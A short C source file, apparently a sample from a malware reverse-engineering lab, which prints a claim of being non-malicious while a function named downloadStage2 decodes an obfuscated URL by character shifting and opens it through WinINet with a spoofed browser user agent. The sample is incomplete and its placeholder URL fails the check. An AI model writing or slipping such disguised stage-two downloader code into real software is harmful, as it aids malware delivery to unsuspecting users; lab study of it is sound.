#include <stdio.h>
#include <string.h>
#include "main.h"
char encoded_URL[] = "abc";

int main() {
	printf("A definitely non-malicious program\n");
	downloadStage2();
	
}
int downloadStage2() {
	int result = 0;
	HINTERNET hInternet = NULL;
	HINTERNET hURL = NULL;
	for (int i = 0; i < sizeof(encoded_URL) - 1; i++) {
		encoded_URL[i] += 3;
	}
	// https://github.com/cdong1012/MalwareRELab1
	if (strncmp(encoded_URL, "https:", 6)) {
		result = -1;
		goto CLEANUP;
	}

	hInternet = InternetOpen(
		L"Mozilla/5.0",
		INTERNET_OPEN_TYPE_DIRECT,
		NULL,
		NULL,
		0);

	if (hInternet == INVALID_HANDLE_VALUE) {
		result = -1;
		goto CLEANUP;
	}

	// Make connection to desired page.
	hURL = InternetOpenUrlA(
		hInternet,                       // session handle
		(char*) encoded_URL,  // URL to access
		NULL, 0, 0, 0);                         // defaults

	if (hURL == INVALID_HANDLE_VALUE) {
		result = -1;
		goto CLEANUP;
	}



CLEANUP:
	if (hInternet != NULL) {
		CloseHandle(hInternet);
	}
	
	if (hURL != NULL) {
		CloseHandle(hURL);
	}

	printf("%d %s\n", sizeof(encoded_URL), (char *)encoded_URL);
	return 0;
}

//PCSTR StrChrA(
//	[in] PCSTR pszStart,
//	WORD  wMatch
//);